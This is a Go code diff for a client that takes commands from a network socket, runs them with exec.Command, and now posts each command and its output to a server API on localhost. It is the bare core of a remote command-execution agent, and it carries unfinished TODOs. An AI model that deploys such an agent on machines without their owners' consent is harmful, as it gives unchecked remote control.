@@ -123,10 +123,10 @@ type Data struct {
 //curl -X POST http://localhost:8080 -H 'Content-Type: application/json' -d '{"command":"my command","result":"my result", "time":"my time"}'
 
 // Function to send request to server API
-func respondToServer() error {
+func respondToServer(command, result string) error {
     data := &Data{
-        Command:  "my command", // TODO: get server command
-        Result:   "my result",  // TODO: get result
+        Command:  command,      // TODO: get server command
+        Result:   result,       // TODO: get result
         Time:     "my time",    // TODO: get the real timestamp
     }
 
@@ -166,15 +166,16 @@ func getCommands(client Client, clientSocket net.Listener) error {
         }
 
         // Executes command
-        out, err := exec.Command(string(serverCommand[:serverCommandLen])).Output()
+        command := string(serverCommand[:serverCommandLen])
+        out, err := exec.Command(command).Output()
 
         if err != nil {
             log.Fatal(err)
         }
 
         // TODO:send response to server web app
-        fmt.Println(string(out))
-        respondToServer()
+        //fmt.Println(string(out))
+        respondToServer(command, string(out))
     }
 }
 
